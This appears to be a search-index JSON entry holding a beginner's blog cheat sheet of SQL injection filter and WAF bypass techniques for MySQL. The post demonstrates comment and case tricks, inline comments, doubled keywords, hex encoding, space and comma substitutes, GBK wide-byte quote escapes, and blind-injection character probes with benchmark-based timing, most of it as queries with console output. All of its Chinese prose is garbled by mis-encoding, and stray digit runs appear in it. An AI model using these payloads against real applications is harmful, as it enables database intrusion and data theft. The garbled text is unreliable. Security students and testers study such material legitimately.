[{"title":"SQLÊ≥®ÂÖ•ÁªïËøáÁöÑÁÆÄÂçïÊÄªÁªì","url":"/2022/03/18/sqlInjectSummary/","content":"Êñ∞‰∫∫webÊâãÂØπsqlÊ≥®ÂÖ•ÁöÑ‰∏Ä‰∫õÁÆÄÂçïÊÄªÁªì\nSQLËØ≠Ê≥ïÂ≠¶‰π†Âü∫Á°ÄÂøÖÂ≠¶Ë¶ÅÊâìÁâ¢ÔºåÈ¶ñÂÖàË¶Å‰ºöSQLÊü•ËØ¢ËØ≠Âè•ÊâçËÉΩ‰ºöSQLÊ≥®ÂÖ•ÂòõÔºåÂ≠¶‰π†ÁΩëÁ´ô\nÂ∏∏Áî®ÂáΩÊï∞‰ªãÁªç\nCOUNT(column_name) ÂáΩÊï∞ËøîÂõûÊåáÂÆöÂàóÁöÑÂÄºÁöÑÊï∞ÁõÆÔºàNULL ‰∏çËÆ°ÂÖ•ÔºâÔºö\n\nCOUNT() ÂáΩÊï∞ËøîÂõûË°®‰∏≠ÁöÑËÆ∞ÂΩïÊï∞Ôºö\n\n\n\nASCII(str) ËøîÂõûÂÄº‰∏∫Â≠óÁ¨¶‰∏≤str  ÁöÑÊúÄÂ∑¶Â≠óÁ¨¶ÁöÑASCIIÂÄº„ÄÇÂÅáÂ¶Çstr‰∏∫Á©∫Â≠óÁ¨¶‰∏≤ÔºåÂàôËøîÂõûÂÄº‰∏∫ 0 „ÄÇ\nORD(char) ËøîÂõûÂ≠óÁ¨¶ÁöÑ ASCII ÂÄº\nGROUP_CONCAT(expr) ËØ•ÂáΩÊï∞ËøîÂõûÂ∏¶ÊúâÊù•Ëá™‰∏Ä‰∏™ÁªÑÁöÑËøûÊé•ÁöÑÈùûNULLÂÄºÁöÑÂ≠óÁ¨¶‰∏≤ÁªìÊûú„ÄÇÂç≥Â∞ÜexprÁöÑÊï∞ÊçÆÊï¥ÂêàÂà∞‰∏ÄËµ∑„ÄÇ\nCHAR(ascii,‚Ä¶)Â∞Ü‰∏Ä‰∏™ÊàñÂ§ö‰∏™asciiÁ†Å( ,ÂàÜÈöî)ËΩ¨‰∏∫Â≠óÁ¨¶ÊàñÂ≠óÁ¨¶‰∏≤„ÄÇ\nCONCAT(str1,str2,‚Ä¶)  ËøîÂõûÁªìÊûú‰∏∫ËøûÊé•ÂèÇÊï∞‰∫ßÁîüÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇ\nLENGTH(str) ËøîÂõûÂÄº‰∏∫Â≠óÁ¨¶‰∏≤str ÁöÑÈïøÂ∫¶ÔºåÂçï‰Ωç‰∏∫Â≠óËäÇ„ÄÇ\n\n\nSUBSTR(str,start,len) ËøîÂõûstartÂºÄÂßãÔºåÈïøÂ∫¶‰∏∫lenÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇÊ≥®ÊÑè:Â≠óÁ¨¶‰∏≤Ëµ∑Âßã‰ΩçÁΩÆ‰∏∫1„ÄÇ\n\nMID() Áî®Ê≥ïÂíå‰∏äËø∞‰∏ÄÊ†∑„ÄÇ\n\nLEFT(str,len) ËøîÂõûÂ≠óÁ¨¶‰∏≤strËá™ÊúÄÂ∑¶ËæπÂºÄÂßãÁöÑlen‰∏™Â≠óÁ¨¶„ÄÇ\n\nRIGHT(str,len)ËøîÂõûÂ≠óÁ¨¶‰∏≤strËá™ÊúÄÂè≥ËæπÂºÄÂßãÁöÑlen‰∏™Â≠óÁ¨¶„ÄÇ\n\nREVERSE(str) ÂèçËΩ¨Â≠óÁ¨¶‰∏≤„ÄÇ\n\nIF(ËØ≠Âè•0,ËØ≠Âè•1,ËØ≠Âè•2)  Ëã• ËØ≠Âè•0 ‰∏∫ÁúüÂàôÊâßË°å ËØ≠Âè•1ÔºåÂê¶ÂàôÊâßË°åËØ≠Âè•2  \n\nLPAD(str,len,padstr) ËøîÂõûÂ≠óÁ¨¶‰∏≤ str,  ÂÖ∂Â∑¶ËæπÁî±Â≠óÁ¨¶‰∏≤padstr  Â°´Ë°•Âà∞len  Â≠óÁ¨¶ÈïøÂ∫¶„ÄÇÂÅáÂ¶Çstr  ÁöÑÈïøÂ∫¶Â§ß‰∫élen, ÂàôËøîÂõûÂÄºË¢´Áº©Áü≠Ëá≥  len Â≠óÁ¨¶„ÄÇ\n\nRPAD(str,len,padstr)ËøîÂõûÂ≠óÁ¨¶‰∏≤str, ÂÖ∂Âè≥ËæπË¢´Â≠óÁ¨¶‰∏≤padstrÂ°´Ë°•Ëá≥lenÂ≠óÁ¨¶ÈïøÂ∫¶„ÄÇÂÅáÂ¶ÇÂ≠óÁ¨¶‰∏≤str ÁöÑÈïøÂ∫¶Â§ß‰∫élen,ÂàôËøîÂõûÂÄºË¢´Áº©Áü≠Âà∞‰∏élen Â≠óÁ¨¶Áõ∏ÂêåÈïøÂ∫¶„ÄÇ\nmysql> SELECT LPAD('hi',4,'??');\n        -> '??hi'\nmysql> SELECT LPAD('hi',1,'??');\n        -> 'h'\n        \nmysql> SELECT RPAD('hi',5,'?');\n        -> 'hi???'\nmysql> SELECT RPAD('hi',1,'?');\n        -> 'h'\n\n\n\nsleep(duration) Áù°Áú†(ÊöÇÂÅú) Êó∂Èó¥‰∏∫duration  ÂèÇÊï∞ÁªôÂÆöÁöÑÁßíÊï∞ÔºåÁÑ∂ÂêéËøîÂõû 0„ÄÇ\n\ndatabase() Ëé∑ÂèñÂΩìÂâçÊï∞ÊçÆÂ∫ìÂêç„ÄÇ\n\n\nÂ∏∏Áî®ËøêÁÆóÁ¨¶ÂíåÂÖ≥ÈîÆÂ≠ó\nunionÁî®‰∫éËÅîÂêàÊü•ËØ¢  (Ê≥®ÊÑè:ÂøÖÈ°ªË¶ÅÊúâÁõ∏ÂêåÁöÑÂ≠óÊÆµÊï∞ÔºåÊ≥®ÂÖ•Êó∂ÈÄöÂ∏∏ÂÖàÁî®order by ÊµãËØï‰∏ãÊúâÂá†‰∏™Â≠óÊÆµ)\n&#39;Áî®‰∫éÈó≠ÂêàËØ≠Âè•\n‰∏çÂ∏¶ÂºïÂè∑ÁöÑ‰ª•  0X  ÂºÄÂ§¥ÁöÑÂçÅÂÖ≠ËøõÂà∂ÂÄºÂú®MYSQL‰∏≠‰ºöË¢´Ëß£Èáä‰∏∫ÂØπÂ∫îÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇ\nÂèçÂºïÂè∑ Áî®‰∫éÂå∫ÂàÜMYSQLÁöÑ‰øùÁïôÂ≠ó‰∏éÊôÆÈÄöÂ≠óÁ¨¶ËÄåÂºïÂÖ•ÁöÑÁ¨¶Âè∑ÔºåÂ¶ÇÔºö\n\nSELECT`select`from`test`WHERE`select`='Â≠óÊÆµÂÄº';#Êú™‰ΩøÁî®Á©∫Ê†ºÔºåÊòØ‰∏ÄÁßçÁªïËøáÊñπÂºè\n\n\n‰∏çÁ≠â‰∫é !=  Êàñ&lt;&gt;ÔºåÂèñÈùû ! Êàñnot\n=  in  like  regexp !(ËØ≠Âè•&lt;&gt;ËØ≠Âè•)ËøôÂá†‰∏™ÂÖ≥ÈîÆÂ≠óÁ≠â‰ª∑ÔºåÂ¶Ç:\n\nselect * from myTable where id=1;\nselect * from myTable where id in (1);  #inÂêéÈù¢ÂèÇÊï∞ÂøÖÈ°ªÂä†(),()‰∏≠ÂèØÂåπÈÖçÂ§ö‰∏™ÔºåÁî®,ÂàÜÈöî\nselect * from myTable where id like 1;  #likeÂèØÂä†ÈÄöÈÖçÁ¨¶%ËøõË°åÊ®°Á≥äÂåπÈÖç\nselect * from myTable where id regexp 1;#regexpÂèØÁî®‰∫éÊ≠£ÂàôÂåπÈÖç\nselect * from myTable where !(id&lt;>1);\n\nËøôÂá†‰∏™Âè•Â≠êÁ≠â‰ª∑„ÄÇ\n\nÊØîËæÉËøêÁÆóÁ¨¶,Â§ß‰∫éÂ∞è‰∫éÂè∑&gt; &lt; Ôºåbetween A and B(AÂíåBÊòØÂèÇÊï∞)\n\ninformation_schema Âú®mysql‰∏≠ÂåÖÂê´ÊâÄÊúâÁöÑÊï∞ÊçÆÂ∫ìÁöÑÁõ∏ÂÖ≥‰ø°ÊÅØÔºåÂÖ∂‰∏≠ÁöÑinformation_schema.tables Âíåinformation_schema.columns ÁªèÂ∏∏Áî®Âà∞ÔºåÔºàtable_schemaÔºåtable_nameÔºâÂíåcolumn_nameÂàÜÂà´ÊòØÂÖ∂Â≠óÊÆµÂêç‰πã‰∏Ä„ÄÇtable_schemaÊòØÊï∞ÊçÆÂ∫ìÂêçÔºåtable_nameÊòØË°®ÂêçÔºåcolumn_nameÊòØÂ≠óÊÆµÂêç„ÄÇ\n\nÂúÜÊã¨Âè∑„ÄÄ(...)  ‰ΩøÁî®Êã¨ÂºßÊù•ËßÑÂÆöË°®ËææÂºèÁöÑËøêÁÆóÈ°∫Â∫èÔºå‰æãÂ¶ÇÔºö\nSELECT (1+2)*3;# 9\nselect(some_column)from(myTable)where(id=1);#Êú™‰ΩøÁî®Á©∫Ê†º\n\nÊ≥®ÈáäÁ¨¶ #    /**/\n\n‰∏éËøêÁÆóÁ¨¶ and    &amp;&amp;\n\nÊàñËøêÁÆóÁ¨¶ or   ||\n\nÂºÇÊàñËøêÁÆóÁ¨¶ ^   xor\nÊ≥®ÊÑèÔºöÂ¶ÇÊûúÂú®ÊµèËßàÂô®‰∏≠Âú∞ÂùÄÊ†èËæìÂÖ•Ë¶ÅËøõË°åurlÁºñÁ†Å,&amp; urlencodeÂêé‰∏∫ %26  #‰∏∫%23\n\nfrom num1 for num2  ÂèØÁî®‰∫ésubstr(str,start,end)Á≠â ‰ª£Êõø ,Â¶ÇÔºö\nsubstr(database(),1,1)\nÁ≠â‰ª∑‰∫é\nsubstr(database()from 1 for 1)\n\nÂ∏∏Áî®ÁªïËøáÊñπÊ≥ïÊ≥®ÈáäÁ¨¶Âè∑ÁªïËøáÂ∏∏Áî®ÁöÑÊ≥®ÈáäÁ¨¶Êúâ\n-- Ê≥®ÈáäÂÜÖÂÆπ\n# Ê≥®ÈáäÂÜÖÂÆπ\n/*Ê≥®ÈáäÂÜÖÂÆπ*/\n;\n\nÂÆû‰æã\nmysql> select * from users -- where id = 1;\n    -> ;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n|  2 | user2    | pass1    |\n1234567\nmysql> select * from users # where id = 2;\n    -> ;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n|  2 | user2    | pass1    |\n1234567\nmysql> select * from users where id = 3 /*+1*/\n    -> ;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  3 | test3    | pass1    |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\nÂ§ßÂ∞èÂÜôÁªïËøáÂ∏∏Áî®‰∫é wafÁöÑÊ≠£ÂàôÂØπÂ§ßÂ∞èÂÜô‰∏çÊïèÊÑüÁöÑÊÉÖÂÜµÔºå‰∏ÄËà¨ÈÉΩÊòØÈ¢òÁõÆËá™Â∑±ÊïÖÊÑèËøôÊ†∑ËÆæËÆ°„ÄÇ‰æãÂ¶ÇÔºöwafËøáÊª§‰∫ÜÂÖ≥ÈîÆÂ≠óselectÔºåÂèØ‰ª•Â∞ùËØï‰ΩøÁî®SelectÁ≠âÁªïËøá„ÄÇ\nmysql> select * from users where id = -1 union select 1,2,3\n    -> ;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | 2        | 3        |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\n#Â§ßÂ∞èÂÜôÁªïËøá\nmysql> select * from users where id = -1 union Select 1,2,3;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | 2        | 3        |\n+----+----------+----------+\n\nÂÜÖËÅîÊ≥®ÈáäÁªïËøáÂÜÖËÅîÊ≥®ÈáäÂ∞±ÊòØÊää‰∏Ä‰∫õÁâπÊúâÁöÑ‰ªÖÂú®MYSQL‰∏äÁöÑËØ≠Âè•ÊîæÂú® /*!...*/ ‰∏≠ÔºåËøôÊ†∑Ëøô‰∫õËØ≠Âè•Â¶ÇÊûúÂú®ÂÖ∂ÂÆÉÊï∞ÊçÆÂ∫ì‰∏≠ÊòØ‰∏ç‰ºöË¢´ÊâßË°åÔºå‰ΩÜÂú®MYSQL‰∏≠‰ºöÊâßË°å„ÄÇ\nmysql> select * from users where id = -1 union /*!select*/ 1,2,3;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | 2        | 3        |\n+----+----------+----------+\n\nÂèåÂÜôÂÖ≥ÈîÆÂ≠óÁªïËøáÂú®Êüê‰∏Ä‰∫õÁÆÄÂçïÁöÑwaf‰∏≠ÔºåÂ∞ÜÂÖ≥ÈîÆÂ≠óselectÁ≠âÂè™‰ΩøÁî®replace()ÂáΩÊï∞ÁΩÆÊç¢‰∏∫Á©∫ÔºåËøôÊó∂ÂÄôÂèØ‰ª•‰ΩøÁî®ÂèåÂÜôÂÖ≥ÈîÆÂ≠óÁªïËøá„ÄÇ‰æãÂ¶ÇselectÂèòÊàêseleselectctÔºåÂú®ÁªèËøáwafÁöÑÂ§ÑÁêÜ‰πãÂêéÂèàÂèòÊàêselectÔºåËææÂà∞ÁªïËøáÁöÑË¶ÅÊ±Ç„ÄÇ\nÁâπÊÆäÁºñÁ†ÅÁªïËøá\nÂçÅÂÖ≠ËøõÂà∂ÁªïËøá\n\nmysql> select * from users where username = 0x7465737431;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n\n\nasciiÁºñÁ†ÅÁªïËøáTest Á≠â‰ª∑‰∫éCHAR(101,97,115,116)\n\nÁ©∫Ê†ºËøáÊª§ÁªïËøá‰∏ÄËà¨ÁªïËøáÁ©∫Ê†ºËøáÊª§ÁöÑÊñπÊ≥ïÊúâ‰ª•‰∏ãÂá†ÁßçÊñπÊ≥ïÊù•Âèñ‰ª£Á©∫Ê†º\n/**/\n()\nÂõûËΩ¶(urlÁºñÁ†Å‰∏≠ÁöÑ%0a)\n` ÂèçÂºïÂè∑ÁªïËøá\ntap\n‰∏§‰∏™Á©∫Ê†º\n\nÂÆû‰æã\nmysql> select/**/*/**/from/**/users;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n|  2 | user2    | pass1    |\n|  3 | test3    | pass1    |\n+----+----------+----------+\n#Ê≥®ÊÑèÊã¨Âè∑‰∏≠‰∏çËÉΩÂê´Êúâ*\nmysql> select(id)from(users);\n+----+\n| id |\n+----+\n|  1 |\n|  3 |\n#ÂõûËΩ¶Á¨¶ %0a\nmysql> select\n    -> *\n    -> from \n    -> users\n    -> where \n    -> id = 1;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\nmysql> select`id`from`users`where`id`=1;\n+----+\n| id |\n+----+\n|  1 |\n+----+\n\nËøáÊª§or and xor not ÁªïËøáand = &amp;&amp;\nor = ||\nxor = | # ÂºÇÊàñ\nnot = !\n\nËøáÊª§Á≠âÂè∑&#x3D;ÁªïËøá\n‰∏çÂä†ÈÄöÈÖçÁ¨¶ÁöÑlikeÊâßË°åÁöÑÊïàÊûúÂíå=‰∏ÄËá¥ÔºåÊâÄ‰ª•ÂèØ‰ª•Áî®Êù•ÁªïËøá„ÄÇ\n\nÊ≠£Â∏∏Âä†‰∏äÈÄöÈÖçÁ¨¶ÁöÑlikeÔºö\nmysql> select * from users where username like \"test%\";\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n|  3 | test3    | pass1    |\n+----+----------+----------+\n\n‰∏çÂä†‰∏äÈÄöÈÖçÁ¨¶ÁöÑlikeÂèØ‰ª•Áî®Êù•Âèñ‰ª£=Ôºö\nmysql> select * from users where id like 1;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n\n\nrlike:Ê®°Á≥äÂåπÈÖçÔºåÂè™Ë¶ÅÂ≠óÊÆµÁöÑÂÄº‰∏≠Â≠òÂú®Ë¶ÅÊü•ÊâæÁöÑ ÈÉ®ÂàÜ Â∞±‰ºöË¢´ÈÄâÊã©Âá∫Êù•Áî®Êù•Âèñ‰ª£=Êó∂ÔºårlikeÁöÑÁî®Ê≥ïÂíå‰∏äÈù¢ÁöÑlike‰∏ÄÊ†∑ÔºåÊ≤°ÊúâÈÄöÈÖçÁ¨¶ÊïàÊûúÂíå=‰∏ÄÊ†∑\n\nmysql> select * from users where id rlike 1;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n\n\nregexp:MySQL‰∏≠‰ΩøÁî® REGEXP Êìç‰ΩúÁ¨¶Êù•ËøõË°åÊ≠£ÂàôË°®ËææÂºèÂåπÈÖç\n\nmysql> select * from users where id regexp 1;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n\n\n‰ΩøÁî®Â§ßÂ∞è‰∫éÂè∑Êù•ÁªïËøá\n\nmysql> select * from users where id > 1 and id &lt; 3;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  2 | user2    | pass1    |\n+----+----------+----------+\n\n\n&lt;&gt; Á≠â‰ª∑‰∫é !&#x3D;ÊâÄ‰ª•Âú®ÂâçÈù¢ÂÜçÂä†‰∏Ä‰∏™!ÁªìÊûúÂ∞±ÊòØÁ≠âÂè∑‰∫Ü\n\nmysql> select * from users where !(id &lt;> 1);\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\nmysql> select * from users where id = 1;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\nÁ≠âÂè∑ÁªïËøá‰πüÂèØ‰ª•‰ΩøÁî®strcmp(str1,str2)ÂáΩÊï∞„ÄÅbetweenÂÖ≥ÈîÆÂ≠óÁ≠âÔºåÂÖ∑‰ΩìÂèØ‰ª•ÂèÇËÄÉÂêéÈù¢ÁöÑËøáÊª§Â§ßÂ∞è‰∫éÂè∑ÁªïËøá\nËøáÊª§Â§ßÂ∞è‰∫éÂè∑ÁªïËøáÂú®sqlÁõ≤Ê≥®‰∏≠Ôºå‰∏ÄËà¨‰ΩøÁî®Â§ßÂ∞è‰∫éÂè∑Êù•Âà§Êñ≠asciiÁ†ÅÂÄºÁöÑÂ§ßÂ∞èÊù•ËææÂà∞ÁàÜÁ†¥ÁöÑÊïàÊûú„ÄÇ‰ΩÜÊòØÂ¶ÇÊûúËøáÊª§‰∫ÜÂ§ßÂ∞è‰∫éÂè∑ÁöÑËØùÔºåÈÇ£Â∞±ÂáâÂáâ„ÄÇÊÄé‰πà‰ºöÂë¢ÔºåÂèØ‰ª•‰ΩøÁî®‰ª•‰∏ãÁöÑÂÖ≥ÈîÆÂ≠óÊù•ÁªïËøá\n\ngreatest(n1, n2, n3‚Ä¶):ËøîÂõûn‰∏≠ÁöÑÊúÄÂ§ßÂÄº\n\nmysql> select * from users where id = 1 and greatest(ascii(substr(username,1,1)),1)=116;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n\n\nleast(n1,n2,n3‚Ä¶):ËøîÂõûn‰∏≠ÁöÑÊúÄÂ∞èÂÄº\nstrcmp(str1,str2):Ëã•ÊâÄÊúâÁöÑÂ≠óÁ¨¶‰∏≤ÂùáÁõ∏ÂêåÔºåÂàôËøîÂõû  0ÔºåËã•Ê†πÊçÆÂΩìÂâçÂàÜÁ±ªÊ¨°Â∫èÔºåÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞Â∞è‰∫éÁ¨¨‰∫å‰∏™ÔºåÂàôËøîÂõû -1ÔºåÂÖ∂ÂÆÉÊÉÖÂÜµËøîÂõû 1\n\nmysql> select * from users where id = 1 and !strcmp(ascii(substr(username,1,1)),116);\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\nmysql> select * from users where id = 1 and !strcmp(ascii(substr(username,1,1)),117);\nEmpty set (0.00 sec)\n\n\ninÂÖ≥ÈîÆÂ≠ó\n\nmysql> select * from users where id = 1 and substr(username,1,1) in ('t');\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n1 row in set (0.01 sec)\n\nmysql> select * from users where id = 1 and substr(username,1,1) in ('y');\nEmpty set (0.00 sec)\n\n\nbetween a and b:ËåÉÂõ¥Âú®a-b‰πãÈó¥\n\nmysql> select * from users where id between 1 and 2;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n|  2 | user2    | pass1    |\n+----+----------+----------+\n2 rows in set (0.00 sec)\n\nmysql> select * from users where id = 1 and substr(username,1,1) between 'a' and 'b';\nEmpty set (0.00 sec)\n\nmysql> select * from users where id = 1 and substr(username,1,1) between 'a' and 't';\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\n‰ΩøÁî®between a and bÂà§Á≠â\nmysql> select * from users where id = 1 and substr(username,1,1) between 't' and 't';\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n+----+----------+----------+\n\nËøáÊª§ÂºïÂè∑ÁªïËøá\n‰ΩøÁî®ÂçÅÂÖ≠ËøõÂà∂\n\nselect column_name  from information_schema.tables where table_name=0x7573657273;\n1\n\n\nÂÆΩÂ≠óËäÇ\n\nÂ∏∏Áî®Âú®webÂ∫îÁî®‰ΩøÁî®ÁöÑÂ≠óÁ¨¶ÈõÜ‰∏∫GBKÊó∂ÔºåÂπ∂‰∏îËøáÊª§‰∫ÜÂºïÂè∑ÔºåÂ∞±ÂèØ‰ª•ËØïËØïÂÆΩÂ≠óËäÇ„ÄÇ\n# ËøáÊª§ÂçïÂºïÂè∑Êó∂\n%bf%27 %df%27 %aa%27\n12\n%df\\‚Äô &#x3D; %df%5c%27&#x3D;Á∏ó‚Äô\n1\n\nËøáÊª§ÈÄóÂè∑ÁªïËøáÂ¶ÇÊûúwafËøáÊª§‰∫ÜÈÄóÂè∑ÔºåÂπ∂‰∏îÂè™ËÉΩÁõ≤Ê≥®ÔºàÁõ≤Ê≥®Âü∫Êú¨Á¶ª‰∏çÂºÄÈÄóÂè∑ÂïäÂñÇÔºâÔºåÂú®ÂèñÂ≠ê‰∏≤ÁöÑÂá†‰∏™ÂáΩÊï∞‰∏≠ÔºåÊúâ‰∏Ä‰∏™Êõø‰ª£ÈÄóÂè∑ÁöÑÊñπÊ≥ïÂ∞±ÊòØ‰ΩøÁî®from pos for lenÔºåÂÖ∂‰∏≠pos‰ª£Ë°®‰ªépos‰∏™ÂºÄÂßãËØªÂèñlenÈïøÂ∫¶ÁöÑÂ≠ê‰∏≤‰æãÂ¶ÇÂú®substr()Á≠âÂáΩÊï∞‰∏≠ÔºåÂ∏∏ËßÑÁöÑÂÜôÊ≥ïÊòØ\nmysql> select substr(\"string\",1,3);\n+----------------------+\n| substr(\"string\",1,3) |\n+----------------------+\n| str                  |\n+----------------------+\n\n\nÂ¶ÇÊûúËøáÊª§‰∫ÜÈÄóÂè∑ÔºåÂèØ‰ª•ËøôÊ†∑‰ΩøÁî®from pos for lenÊù•Âèñ‰ª£\n\nmysql> select substr(\"string\" from 1 for 3);\n+-------------------------------+\n| substr(\"string\" from 1 for 3) |\n+-------------------------------+\n| str                           |\n+-------------------------------+\n1 row in set (0.00 sec)\n\nÂú®sqlÁõ≤Ê≥®‰∏≠ÔºåÂ¶ÇÊûúËøáÊª§ÈÄóÂè∑Ôºå‰ª•‰∏ãÂèÇËÄÉ‰∏ãÈù¢ÁöÑÂÜôÊ≥ïÁªïËøá\nmysql> select ascii(substr(database() from 1 for 1)) > 120;\n+----------------------------------------------+\n| ascii(substr(database() from 1 for 1)) > 120 |\n+----------------------------------------------+\n|                                            0 |\n+----------------------------------------------+\n1 row in set (0.00 sec)\n\nmysql> select ascii(substr(database() from 1 for 1)) > 110;\n+----------------------------------------------+\n| ascii(substr(database() from 1 for 1)) > 110 |\n+----------------------------------------------+\n|                                            1 |\n+----------------------------------------------+\n\n\n‰πüÂèØ‰ΩøÁî®joinÂÖ≥ÈîÆÂ≠óÊù•ÁªïËøá\n\nmysql> select * from users union select * from (select 1)a join (select 2)b join(select 3)c;\n#ÂÉè(select 1)aÊòØÂ≠êÊü•ËØ¢ÔºåÂµåÂ•óÊü•ËØ¢ÁöÑÊó∂ÂÄôÂ≠êÊü•ËØ¢Âá∫Êù•ÁöÑÁªìÊûúÊòØ‰Ωú‰∏∫‰∏Ä‰∏™Ê¥æÁîüË°®Êù•ËøõË°å‰∏ä‰∏ÄÁ∫ßÁöÑÊü•ËØ¢ÁöÑÔºåÊâÄ‰ª•Â≠êÊü•ËØ¢ÁöÑÁªìÊûúÂøÖÈ°ªË¶ÅÊúâ‰∏Ä‰∏™Âà´Âêç„ÄÇaÊòØÂà´Âêç„ÄÇ\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | test1    | pass     |\n|  2 | user2    | pass1    |\n|  3 | test3    | pass1    |\n|  1 | 2        | 3        |\n+----+----------+----------+\n\nÂÖ∂‰∏≠ÁöÑ\nunion select * from (select 1)a join (select 2)b join(select 3)c\n\nÁ≠â‰ª∑‰∫é\nunion select 1,2,3\n\n\n‰ΩøÁî®likeÂÖ≥ÈîÆÂ≠óÈÄÇÁî®‰∫ésubstr()Á≠âÊèêÂèñÂ≠ê‰∏≤ÁöÑÂáΩÊï∞‰∏≠ÁöÑÈÄóÂè∑\n\nmysql> select ascii(substr(user(),1,1))=114;\n+-------------------------------+\n| ascii(substr(user(),1,1))=114 |\n+-------------------------------+\n|                             1 |\n+-------------------------------+\n\nmysql> select user() like \"r%\";\n+------------------+\n| user() like \"r%\" |\n+------------------+\n|                1 |\n+------------------+\n\nmysql> select user() like \"t%\";\n+------------------+\n| user() like \"t%\" |\n+------------------+\n|                0 |\n+------------------+\n\n\n‰ΩøÁî®offsetÂÖ≥ÈîÆÂ≠óÈÄÇÁî®‰∫élimit‰∏≠ÁöÑÈÄóÂè∑Ë¢´ËøáÊª§ÁöÑÊÉÖÂÜµlimit 2,1Á≠â‰ª∑‰∫élimit 1 offset 2\n\nmysql> select * from users limit 2,1;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  3 | test3    | pass1    |\n+----+----------+----------+\n\nmysql> select * from users limit 1 offset 2;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  3 | test3    | pass1    |\n+----+----------+----------+\n12345678910111213\n\nËøáÊª§ÂáΩÊï∞ÁªïËøá\nsleep() ‚Äì&gt;benchmark()\n\nmysql> select 12,23 and sleep(1);\n+----+-----------------+\n| 12 | 23 and sleep(1) |\n+----+-----------------+\n| 12 |               0 |\n+----+-----------------+\n1 row in set (1.00 sec)\n# MySQLÊúâ‰∏Ä‰∏™ÂÜÖÁΩÆÁöÑBENCHMARK()ÂáΩÊï∞ÔºåÂèØ‰ª•ÊµãËØïÊüê‰∫õÁâπÂÆöÊìç‰ΩúÁöÑÊâßË°åÈÄüÂ∫¶„ÄÇ \nÂèÇÊï∞ÂèØ‰ª•ÊòØÈúÄË¶ÅÊâßË°åÁöÑÊ¨°Êï∞ÂíåË°®ËææÂºè„ÄÇÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÊòØÊâßË°åÊ¨°Êï∞ÔºåÁ¨¨‰∫å‰∏™ÊâßË°åÁöÑË°®ËææÂºè\nmysql> select 12,23 and benchmark(1000000000,1);\n+----+--------------------------------+\n| 12 | 23 and benchmark(1000000000,1) |\n+----+--------------------------------+\n| 12 |                              0 |\n+----+--------------------------------+\n1 row in set (4.61 sec)\n\n\nascii()‚Äì&gt;hex()„ÄÅbin()Êõø‰ª£‰πãÂêéÂÜç‰ΩøÁî®ÂØπÂ∫îÁöÑËøõÂà∂ËΩ¨stringÂç≥ÂèØ\ngroup_concat()‚Äì&gt;concat_ws()\n\nmysql> select group_concat(\"str1\",\"str2\");\n+-----------------------------+\n| group_concat(\"str1\",\"str2\") |\n+-----------------------------+\n| str1str2                    |\n+-----------------------------+\n1 row in set (0.00 sec)\n\n#Á¨¨‰∏Ä‰∏™ÂèÇÊï∞‰∏∫ÂàÜÈöîÁ¨¶\nmysql> select concat_ws(\",\",\"str1\",\"str2\");\n+------------------------------+\n| concat_ws(\",\",\"str1\",\"str2\") |\n+------------------------------+\n| str1,str2                    |\n+------------------------------+\n\n\nsubstr(),substring(),mid()ÂèØ‰ª•Áõ∏‰∫íÂèñ‰ª£, ÂèñÂ≠ê‰∏≤ÁöÑÂáΩÊï∞ËøòÊúâleft(),right()\nsubstr(str,start,1) Á≠â‰ª∑‰∫é right(left(str,len),1)     